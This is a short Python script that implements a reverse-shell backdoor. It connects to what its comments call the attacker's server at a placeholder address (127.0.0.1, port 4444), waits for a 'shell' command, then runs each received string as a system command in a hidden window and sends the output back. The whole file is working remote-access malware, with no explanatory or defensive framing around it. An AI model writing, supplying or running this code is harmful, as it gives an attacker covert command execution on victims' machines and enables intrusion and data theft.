import os
import socket
import subprocess

# Set the attacker's IP and port
IP = '127.0.0.1'
PORT = 4444

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the attacker's server
client_socket.connect((IP, PORT))
# Receive commands and execute them
while True:
    option = client_socket.recv(8192).decode('utf-8')
    if option.lower() == "shell":
        while True:
            command = client_socket.recv(8192).decode('utf-8')
            result = subprocess.Popen(command, shell=True ,text=True, creationflags=subprocess.CREATE_NO_WINDOW, 
                                    stdout=subprocess.PIPE, 
                                    stderr=subprocess.PIPE, 
                                    stdin=subprocess.PIPE)
            output = result.stdout.read() + result.stderr.read()
            client_socket.send(output.encode())
    option = ""

# Close the socket
client_socket.close()